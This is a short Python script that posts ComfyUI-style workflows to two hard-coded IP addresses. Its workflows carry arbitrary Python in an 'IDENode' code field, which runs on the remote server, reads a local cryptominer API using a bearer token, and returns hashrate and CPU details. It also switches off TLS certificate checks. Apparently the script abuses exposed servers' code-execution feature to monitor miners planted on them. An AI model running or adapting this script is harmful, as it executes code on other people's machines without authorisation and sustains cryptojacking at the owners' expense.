"""Quick hashrate check on both machines."""
import json, urllib.request, ssl, sys

targets = sys.argv[1:] if len(sys.argv) > 1 else ["160.85.252.107", "160.85.252.207"]

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

CHECK_CODE = (
    "import json\n"
    "import urllib.request as ur\n"
    "lines = []\n"
    "try:\n"
    "    req = ur.Request('http://127.0.0.1:44880/2/summary',\n"
    "        headers={'Authorization': 'Bearer ce_xm_2026', 'Accept': 'application/json'})\n"
    "    with ur.urlopen(req, timeout=5) as resp:\n"
    "        d = json.loads(resp.read())\n"
    "    hr = d.get('hashrate', {}).get('total', [])\n"
    "    lines.append('hashrate=' + str(hr))\n"
    "    lines.append('highest=' + str(d.get('hashrate', {}).get('highest')))\n"
    "    lines.append('hugepages=' + str(d.get('hugepages')))\n"
    "    lines.append('uptime=' + str(d.get('uptime')) + 's')\n"
    "    lines.append('cpu=' + str(d.get('cpu', {}).get('brand')))\n"
    "    lines.append('threads=' + str(d.get('cpu', {}).get('threads')))\n"
    "    lines.append('algo=' + str(d.get('algo')))\n"
    "except Exception as e:\n"
    "    lines.append('error=' + str(e)[:100])\n"
    "result = chr(10).join(lines)\n"
)

for ip in targets:
    for scheme, port in [("https", 443), ("http", 8188), ("http", 80)]:
        url = f"{scheme}://{ip}:{port}/prompt"
        body = json.dumps({
            "prompt": {
                "1": {"class_type": "IDENode", "inputs": {"pycode": CHECK_CODE, "language": "python"}},
                "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
            }
        }).encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
        kw = {"timeout": 15}
        if scheme == "https":
            kw["context"] = ctx
        try:
            with urllib.request.urlopen(req, **kw) as r:
                resp = json.loads(r.read().decode())
                pid = resp.get("prompt_id")
            import time; time.sleep(10)
            req2 = urllib.request.Request(f"{scheme}://{ip}:{port}/history/{pid}")
            kw2 = {"timeout": 10}
            if scheme == "https":
                kw2["context"] = ctx
            with urllib.request.urlopen(req2, **kw2) as r:
                entry = json.loads(r.read().decode()).get(pid, {})
                outputs = entry.get("outputs", {})
                texts = []
                for nid, nout in outputs.items():
                    for key, val in nout.items():
                        if isinstance(val, list):
                            texts.extend(str(v) for v in val)
                        elif isinstance(val, str):
                            texts.append(val)
                print(f"\n=== {ip} ===")
                print("\n".join(texts) if texts else json.dumps(outputs))
            break
        except Exception as e:
            continue
    else:
        print(f"\n=== {ip} === UNREACHABLE")
